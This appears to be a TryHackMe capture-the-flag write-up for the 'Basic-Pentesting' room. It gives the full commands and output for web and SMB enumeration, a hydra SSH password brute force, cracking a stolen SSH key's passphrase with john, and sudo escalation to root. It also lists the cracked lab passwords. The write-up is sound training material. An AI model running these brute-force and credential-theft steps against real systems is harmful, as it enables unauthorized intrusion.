# Basic-Pentesting

**IP:** 10.10.237.124  
**Platform:** THM  
**Difficulty:** Easy  
**OS:** Linux  
**Date:** 31/05/2025

## Summary

A well-rounded, beginner friendly room that involves some basic brute forcing, hash cracking, service enumeration and Linux privilege escalation techniques. 

## Reconnaissance

```bash
nmap -sC -sV -T4 10.10.237.124 -oA nmap/Basic-Pentesting
```

| Port | Service     | Version                         |
| ---- | ----------- | ------------------------------- |
| 22   | ssh         | OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 |
| 80   | http        | Apache httpd 2.4.18             |
| 139  | netbios-ssn | Samba smbd 3.X - 4.X            |
| 445  | netbios-ssn | Samba smbd 4.3.11-Ubuntu        |
| 8009 | ajp13       |                                 |
| 8080 | http-proxy  | Apache Tomcat/9.0.7             |

## Enumeration

Found a `/development` directory on the Apache webserver (:80).
```bash
ffuf -u http://10.10.237.124:80/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -c -fc 403 -v

[Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 19ms]
| URL | http://10.10.237.124:80/development
| --> | http://10.10.237.124/development/
    * FUZZ: development
```

Downloaded the two text files in the directory `dev.txt` and `j.txt`
```bash
wget -rq -np -nH --cut-dirs=1 --reject "index.html*" -e robots=off http://10.10.237.124/development/;ls

dev.txt  j.txt
```

The file `j.txt ` reveals that J has a weak password
```
cat j.txt  

For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

Found a `/manager` directory on the Tomcat server (:8080) that requires simple authentication.
```bash
ffuf -u http://10.10.237.124:8080/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -c -fc 403 -v

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 26ms]
| URL | http://10.10.237.124:8080/manager
| --> | /manager/
    * FUZZ: manager
```

Used my tool `ridwalk` to find two users `jen` and `kay` on the Samba server (:445) via SMB.
```bash
python3 ~/scripts/ridwalk/ridwalk.py 10.10.137.1                                                   
[*] Target: 10.10.137.1 (Unix/Linux Samba)
[*] Authentication: anonymous
[+] Connection status: OK

RID    Type   Name
--------------------------------------------------
1000   User   kay
1001   User   jan
```

## Exploitation

As `j.txt ` mentioned that J(an) had a weak password, I brute-forced it with hydra.
```
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.137.1 -t 10 -vI  

...
[22][ssh] host: 10.10.137.1   login: jan   password: armando
...
```

## Privilege Escalation

After logging into the machine as `jan` via SSH, I ran `linpeas.sh` to discover that `kay`'s SSH private `/home/kay/.ssh/id_rsa` is readable as `jan`.
```
╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                                                                                                    
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 /home/kay/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
...
-----END RSA PRIVATE KEY-----
```

Copied it to my local machine.
```
ssh2john id_rsa > hash
```

Cracked the passphrase with `ssh2john` and `john`.
```   
john hash --wordlist=/usr/share/wordlists/rockyou.txt

...
beeswax          (id_rsa)     
...
```

SSH'd as `kay` and found a `pass.bak` file in their home directory which revealed their password.
```
cat pass.bak 

heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

Used this password to check what the `kay` user could run on the machine as `sudo`, turns out they have full `sudo` permissions!
```
sudo -l
[sudo] password for kay: 
...
User kay may run the following commands on basic2:
    (ALL : ALL) ALL
```

Switched to root.
```
sudo su -

root@basic2:~#
```

---

#nmap #ffuf #hydra #ssh-bruteforce #smb-enum #ssh2john #linpeas #sudo-privesc